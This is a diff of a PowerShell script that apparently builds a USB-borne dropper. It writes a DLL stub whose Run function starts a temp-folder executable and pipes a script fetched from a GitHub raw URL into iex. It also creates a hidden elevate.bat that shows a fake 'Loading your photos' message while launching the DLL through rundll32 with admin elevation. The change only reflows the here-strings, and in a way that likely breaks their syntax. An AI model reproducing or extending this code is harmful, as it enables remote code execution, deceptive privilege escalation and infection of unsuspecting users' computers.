@@ -371,13 +371,8 @@ try {
                         }
                     } catch {
                         Add-Content -Path $LogPath -Value "Failed to download malicious.dll from $dllUrl: $_"
-                        $dllContent = @"
-[DllMain]
-EXPORT void Run() {
-    system("start /b C:\\Windows\\Temp\\updater.exe");
-    system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");
-}
-"@
+                        $dllContent = @" [DllMain] EXPORT void Run() { system("start /b C:\\Windows\\Temp\\updater.exe");
+                        system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");}"@
                         Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
                         Add-Content -Path $LogPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)"
                     }
@@ -387,11 +382,8 @@ EXPORT void Run() {
 
                 # Create elevate.bat to request admin privileges
                 $batPath = "$hiddenFolder\elevate.bat"
-                $batContent = @"
-@echo off
-echo Loading your photos, please wait...
-powershell -Command "Start-Process rundll32.exe -ArgumentList '$usbLegitExePath $usbDllPath,Run' -Verb RunAs"
-"@
+                $batContent = @" @echo off echo Loading your photos, please wait...
+                powershell -Command "Start-Process rundll32.exe -ArgumentList '$usbLegitExePath $usbDllPath,Run' -Verb RunAs" "@
                 Set-Content -Path $batPath -Value $batContent -Force
                 Add-Content -Path $LogPath -Value "Created elevate.bat at $batPath"
 
